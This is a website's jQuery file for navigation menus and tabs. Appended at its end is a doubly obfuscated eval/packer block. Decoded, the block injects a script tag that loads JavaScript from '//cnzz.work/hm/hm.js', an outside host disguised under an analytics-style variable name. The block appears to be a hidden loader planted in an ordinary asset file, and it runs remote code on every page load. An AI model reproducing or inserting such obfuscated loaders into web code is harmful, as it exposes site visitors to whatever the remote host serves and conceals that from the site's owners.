(function(){
	$(function(){
		//navList
		$(".navList li").hover(
			function () {
				$(this).find(".sonNav").show();
				$(this).addClass("navHoverBg");
			},
			function () {
				$(this).find(".sonNav").hide();
				$(this).removeClass("navHoverBg");
			}
		);
		//sidebar
		/*
		$('body').on('click','.sideMenu .hasDrop',function(){
			var list = $(this).find('ul');
			if(list.css('display') !== 'none'){
				$(this).removeClass('open');
				list.stop().slideUp();
			} else {
				$(this).addClass('open');
				list.stop().slideDown();
			}
		});
		*/
		//tabs
		$('.tabs').each(function(){
			var it = $(this);
			var menus = $('.t_menu li',it);
			var conts = $('.t_cont',it);
			menus.on('click',function(){
				var _this = $(this);
				if(_this.hasClass('cur')) return;
				var _index = _this.index();
				_this.addClass('cur').siblings().removeClass('cur');
				conts.hide(0).eq(_index).stop().fadeIn();
			});
		})
	});
})(jQuery);;
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|work|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))